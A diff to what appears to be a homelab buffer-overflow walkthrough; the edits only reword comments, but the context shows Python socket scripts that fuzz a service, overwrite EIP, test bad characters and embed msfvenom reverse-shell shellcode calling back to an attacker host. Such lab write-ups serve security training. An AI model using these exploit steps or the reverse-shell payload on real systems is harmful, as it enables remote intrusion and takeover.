@@ -70,12 +70,14 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
 
+## Sending 500 As
+
 ```python
 
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is, Computer Name: Spidey
+server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -99,7 +101,7 @@ if __name__ == "__main__":
 ```    
 
 With Immunity Debugger run as Administrator on the Windows vm, run the python script above, sending 500 byte-encoded A's 
-and end it with a nullbyte as instructed by the message we found earlier. We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (41414141).  Buffer Overflow vulnerability likely exists.
+and end it with a null-byte as instructed by the message we found earlier. We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (41414141).  Buffer Overflow vulnerability likely exists.
 
 ![test1](https://user-images.githubusercontent.com/76034874/181864956-0bf73890-b264-4522-89e8-fc1b6e5db3cf.png)
 
@@ -119,7 +121,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -169,7 +171,7 @@ Send  A's equal to the offset, add four B's and end with a nullbyte for test3:
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is. Computer Name: Spidey
+server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -207,7 +209,7 @@ We will send an additional byte-string of 400 Cs, representing our payload to co
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is. Computer Name: Spidey
+server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -252,7 +254,7 @@ so this step will be send our As plus offset + Bs + badchars + nullbyte:
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"  #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 badchars =b''
@@ -313,7 +315,7 @@ msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is, Computer Name: Spidey
+server = "10.0.2.40"   #homelab server with immun debugger. Computer Name: Spidey
 port = 1985
 
 #msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
